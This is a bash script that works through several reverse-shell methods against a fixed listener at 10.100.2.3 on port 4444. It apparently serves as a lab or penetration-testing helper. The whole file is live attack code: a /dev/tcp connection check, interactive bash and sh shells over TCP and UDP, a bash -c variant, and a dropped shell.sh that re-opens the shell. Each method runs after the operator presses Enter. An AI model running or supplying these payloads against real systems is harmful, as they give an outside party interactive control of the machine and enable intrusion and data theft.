#!/bin/bash

IP="10.100.2.3"
PORT="4444"

echo "[*] Make sure you have a listener running: nc -lvnp $PORT"
echo "[*] Reverse shell target: $IP:$PORT"
echo

# Optional: Uncomment this line to auto-check if port is open before trying
# timeout 1 bash -c "</dev/tcp/$IP/$PORT" 2>/dev/null && echo "[+] Port is open" || echo "[-] Port is closed"

# ----------------------------
# Only include working payloads
# ----------------------------

# Method 1: Basic TCP check (will hang if no listener)
read -p "[1] Test: echo > /dev/tcp/$IP/$PORT — quick connection check (non-blocking). Press Enter to try."
echo "ping" > /dev/tcp/$IP/$PORT && echo "[+] Connection sent." || echo "[-] Failed."

# Method 2: bash -i (interactive reverse shell)
read -p "[2] Reverse Shell: bash -i >& /dev/tcp/$IP/$PORT 0>&1. Press Enter to execute."
bash -i >& /dev/tcp/$IP/$PORT 0>&1

# Method 3: sh -i over UDP
read -p "[3] Reverse Shell: sh -i >& /dev/udp/$IP/$PORT 0>&1. Press Enter to execute."
sh -i >& /dev/udp/$IP/$PORT 0>&1

# Method 4: bash -c variant
read -p "[4] Reverse Shell: bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'. Press Enter to execute."
bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1"

# Method 5: Write and run script dynamically
read -p "[5] Reverse Shell: Write & run bash file. Press Enter to proceed."
echo -e "#!/bin/bash\nbash -i >& /dev/tcp/$IP/$PORT 0>&1" > shell.sh
chmod +x shell.sh
./shell.sh
